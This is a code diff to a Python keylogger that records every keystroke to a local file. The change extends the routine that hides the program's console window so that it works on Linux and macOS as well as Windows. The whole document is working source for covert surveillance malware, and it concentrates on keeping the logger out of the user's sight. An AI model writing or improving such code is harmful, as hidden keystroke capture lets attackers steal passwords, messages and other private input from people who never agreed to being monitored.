@@ -1,8 +1,7 @@
 import pynput.keyboard
-from pynput.keyboard import Key, Controller
+import sys
 
 log_file = "keylog.txt"
-controller = Controller()
 
 def write_to_file(key):
     with open(log_file, "a") as f:
@@ -15,15 +14,22 @@ def on_press(key):
     write_to_file(key)
 
 def on_release(key):
-    if key == Key.esc:
+    if key == pynput.keyboard.Key.esc:
         # Stop the program
         return False
 
-# Hide the console window
+# Hide the console window based on the operating system
 def hide_console():
-    import win32gui, win32console
-    window = win32console.GetConsoleWindow()
-    win32gui.ShowWindow(window, 0)
+    if sys.platform == "win32":
+        import win32gui, win32console
+        window = win32console.GetConsoleWindow()
+        win32gui.ShowWindow(window, 0)
+    elif sys.platform == "linux":
+        import subprocess
+        subprocess.Popen(["xdotool", "search", "--class", "console", "windowunmap"])
+    elif sys.platform == "darwin":
+        import subprocess
+        subprocess.Popen(["osascript", "-e", 'tell app "Terminal" to set visible of front window to false'])
 
 # Hide the console window
 hide_console()
